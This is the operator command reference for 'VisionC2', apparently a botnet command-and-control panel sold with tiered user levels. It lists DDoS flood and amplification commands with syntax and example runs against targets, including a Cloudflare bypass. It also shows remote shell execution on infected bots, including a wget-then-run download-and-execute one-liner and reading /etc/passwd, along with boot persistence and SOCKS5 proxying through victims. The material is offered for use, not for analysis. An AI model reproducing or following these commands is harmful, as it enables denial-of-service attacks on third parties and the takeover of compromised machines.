# ☾℣☽ VisionC2 Command Reference

> Complete documentation for all CNC commands with examples and permission requirements.

---

## 📊 Permission Levels

| Level | Access |
|-------|--------|
| **Owner** | Full access - all commands including database management |
| **Admin** | Bot management, shell access, all attacks |
| **Pro** | Attack commands, bot targeting, SOCKS proxy |
| **Basic** | Attack commands only |

---

## 🎛️ General Commands

Commands available to all authenticated users.

| Command | Description |
|---------|-------------|
| `help` | Display context-aware help menu based on your permission level |
| `attack` / `methods` | Display all available attack methods |
| `?` | Quick hint showing help and attack commands |
| `bots` | List all connected bots with details |
| `banner` | Redisplay the VisionC2 banner with live stats |
| `clear` / `cls` | Clear the terminal screen |
| `ongoing` | Show currently running attacks |
| `logout` / `exit` | Disconnect from the C2 server |

### Examples

```
[Owner@root]► help
# Displays command menu (general, shell, bot management, etc.)

[Owner@root]► attack
# Displays all attack methods (L4, L7, proxy mode)

[Owner@root]► ?
'help' - commands  |  'attack' - attack methods

[Owner@root]► bots
[Bots: 47]
Connected Bots:
──────────────────────────────────────
  ID: a1b2c3d4 | IP: 192.168.1.100:45231 | Arch: amd64 | RAM: 4.0GB
      Uptime: 2h15m30s | Last: 5s
  ID: e5f6g7h8 | IP: 10.0.0.50:38422 | Arch: arm64 | RAM: 1.0GB
      Uptime: 45m12s | Last: 3s

[Owner@root]► ongoing
Ongoing Attacks:
  !udpflood -> 192.168.1.1:80 (45s remaining)
  !http -> example.com:443 (2m30s remaining)
```

---

## ⚡ Attack Commands

**Required Level:** Basic+

All attack commands are broadcast to ALL connected bots simultaneously.

### Layer 4 Attacks (Network Layer)

| Command | Description | Use Case |
|---------|-------------|----------|
| `!udpflood` | UDP packet flood | Saturate bandwidth |
| `!tcpflood` | TCP connection flood | Exhaust connection tables |
| `!syn` | SYN flood attack | Half-open connection exhaustion |
| `!ack` | ACK flood attack | Firewall/IDS bypass |
| `!gre` | GRE protocol flood | Infrastructure attacks |
| `!dns` | DNS amplification | Reflected amplification |

### Layer 7 Attacks (Application Layer)

| Command | Description | Use Case |
|---------|-------------|----------|
| `!http` | HTTP GET/POST flood | Web server exhaustion |
| `!https` | HTTPS/TLS flood | Encrypted layer 7 |
| `!tls` | TLS flood (alias) | Same as !https |
| `!cfbypass` | Cloudflare bypass | UAM/challenge solving |

### Syntax

```
!<method> <target> <port> <duration> [-p <proxy_url>]
```

### Examples

```bash
# Basic UDP flood for 60 seconds
[Admin@root]► !udpflood 192.168.1.100 80 60
⚡ Target: 192.168.1.100
⚡ Port: 80
⚡ Duration: 60s
⚡ Method: !udpflood

# HTTPS flood against a website
[Admin@root]► !https example.com 443 120

# HTTP flood with proxy support (L7 only)
[Admin@root]► !http target.com 443 60 -p https://proxylist.com/proxies.txt
⚡ Target: target.com
⚡ Port: 443
⚡ Duration: 60s
⚡ Method: !http
⚡ Proxy Mode: Enabled (fetching from https://proxylist.com/proxies.txt)

# Cloudflare bypass attack
[Admin@root]► !cfbypass protected-site.com 443 180

# Stop all running attacks
[Admin@root]► !stop
✓ Stopped 3 attack(s). Kill signal sent to all bots.
```

### Proxy Mode

Layer 7 attacks (`!http`, `!https`, `!tls`, `!cfbypass`) support proxy mode:

```bash
!http target.com 443 60 -p http://example.com/proxies.txt
```

The proxy file should contain one proxy per line in format:

```
ip:port
ip:port:user:pass
http://ip:port
socks5://ip:port
```

---

## 🖥️ Shell Commands

**Required Level:** Admin+

Execute commands on all bots or specific targets.

| Command | Description |
|---------|-------------|
| `!shell <cmd>` | Execute command, wait for output |
| `!exec <cmd>` | Alias for !shell |
| `!detach <cmd>` | Execute in background (no output) |
| `!bg <cmd>` | Alias for !detach |
| `!stream <cmd>` | Real-time output streaming |

### Examples

```bash
# Get system information from all bots
[Admin@root]► !shell uname -a
Shell command sent to all bots: uname -a
Waiting for bot responses...

[Bot: a1b2c3d4] Shell Output:
══════════════════════════════════════════════════════════
Linux server1 5.15.0-generic #1 SMP x86_64 GNU/Linux
══════════════════════════════════════════════════════════

# List running processes
[Admin@root]► !shell ps aux | head -20

# Download and execute (background)
[Admin@root]► !detach wget http://example.com/script.sh -O /tmp/s.sh && chmod +x /tmp/s.sh && /tmp/s.sh
Detached command sent to all bots: wget http://example.com/script.sh...

# Check disk space
[Admin@root]► !shell df -h

# Get network connections
[Admin@root]► !shell netstat -tulpn
```

---

## 🎯 Bot Targeting

**Required Level:** Pro+

Send commands to specific bots instead of broadcasting to all.

### Syntax

```
!<botid> <command>
```

Bot IDs support partial matching (prefix match).

### Examples

```bash
# List bots first to get IDs
[Pro@user]► bots
Connected Bots:
  ID: a1b2c3d4e5f6 | IP: 192.168.1.100:45231 | Arch: amd64
  ID: x9y8z7w6v5u4 | IP: 10.0.0.50:38422 | Arch: arm64

# Target specific bot by full ID
[Pro@user]► !a1b2c3d4e5f6 !shell whoami
Command sent to bot a1b2c3d4e5f6: !shell whoami
Waiting for response...

# Target by partial ID (prefix match)
[Pro@user]► !a1b2 !shell cat /etc/passwd
Command sent to bot a1b2c3d4e5f6: !shell cat /etc/passwd

# Run attack on single bot
[Pro@user]► !x9y8 !udpflood 192.168.1.1 80 30

# Get info from specific bot
[Admin@root]► !a1b2 !info
```

---

## 🤖 Bot Management

**Required Level:** Admin+

Commands for managing the bot lifecycle.

| Command | Description |
|---------|-------------|
| `!info` | Request system info from all bots |
| `!persist` | Setup boot persistence (cron/systemd/init) |
| `!reinstall` | Force bots to re-download and reinstall |
| `!lolnogtfo` | Kill and remove bot from system |

### Examples

```bash
# Get detailed info from all bots
[Admin@root]► !info
Info request sent to all bots

# Setup persistence on all bots
[Admin@root]► !persist
Persistence command sent to all bots

# Force update/reinstall all bots
[Admin@root]► !reinstall
Reinstall command sent to all bots

# Remove all bots (nuclear option)
[Admin@root]► !lolnogtfo
Kill command sent to all bots
```

---

## 🌐 SOCKS Proxy

**Required Level:** Pro+

Establish SOCKS5 reverse proxies through bots.

| Command | Description |
|---------|-------------|
| `!socks <port>` | Start SOCKS5 proxy on specified port |
| `!stopsocks` | Stop all SOCKS5 proxies |

### Examples

```bash
# Start SOCKS5 proxy on port 1080
[Pro@user]► !socks 1080
SOCKS5 proxy started on port 1080 for all bots

# Use with proxychains or browser
# Configure: socks5://bot_ip:1080

# Stop all proxies
[Pro@user]► !stopsocks
SOCKS5 proxy stop command sent to all bots
```

---

## 🔐 Owner Commands

**Required Level:** Owner only

Sensitive administrative commands.

| Command | Description |
|---------|-------------|
| `db` | View user database with credentials |
| `private` | Show private command list |

### Examples

```bash
# View all users and credentials
[Owner@root]► db
════════════════════ User Database ════════════════════
  1. User: root            Pass: s3cr3tp@ss     Level: Owner    Expires: N/A
  2. User: admin           Pass: adm1n123       Level: Admin    Expires: 2026-12-31 [328d]
  3. User: user1           Pass: basicpass      Level: Basic    Expires: 2026-06-15 [EXPIRED]
═══════════════════════════════════════════════════════

# Show private commands
[Owner@root]► private
=== Private Commands (Owner Only) ===
db            - Show user database
```

---

## 📋 Quick Reference Card

```
┌─────────────────────────────────────────────────────────────┐
│                    VisionC2 Quick Reference                 │
├─────────────────────────────────────────────────────────────┤
│ GENERAL                                                     │
│   help          Show commands       bots     List agents    │
│   clear         Clear screen        ongoing  Show attacks   │
│   banner        Show banner         exit     Disconnect     │
├─────────────────────────────────────────────────────────────┤
│ ATTACKS (Basic+)                                            │
│   !udpflood <ip> <port> <time>      !syn <ip> <port> <time> │
│   !tcpflood <ip> <port> <time>      !ack <ip> <port> <time> │
│   !http <url> <port> <time>         !gre <ip> <port> <time> │
│   !https <url> <port> <time>        !dns <ip> <port> <time> │
│   !cfbypass <url> <port> <time>     !stop  Stop all attacks │
├─────────────────────────────────────────────────────────────┤
│ SHELL (Admin+)                                              │
│   !shell <cmd>    Execute + output  !detach <cmd>  Background│
├─────────────────────────────────────────────────────────────┤
│ BOT MGMT (Admin+)                                           │
│   !info       Get bot info          !persist    Setup persist│
│   !reinstall  Force reinstall       !lolnogtfo  Kill bots   │
├─────────────────────────────────────────────────────────────┤
│ TARGETING (Pro+)                                            │
│   !<botid> <cmd>   Send to specific bot (supports prefix)   │
├─────────────────────────────────────────────────────────────┤
│ PROXY (Pro+)                                                │
│   !socks <port>    Start SOCKS5     !stopsocks  Stop proxy  │
├─────────────────────────────────────────────────────────────┤
│ OWNER ONLY                                                  │
│   db              View user database                        │
│   private         Show private commands                     │
└─────────────────────────────────────────────────────────────┘
```

---

## ⚠️ Notes

- **Duration** is always in seconds
- **Port 443** is used for bot-to-CNC communication (TLS encrypted)
- Bots auto-reconnect if connection is lost
- Dead bots are automatically cleaned up after 5 minutes of no response
- All commands are logged server-side

---

*VisionC2 - ☾℣☽*
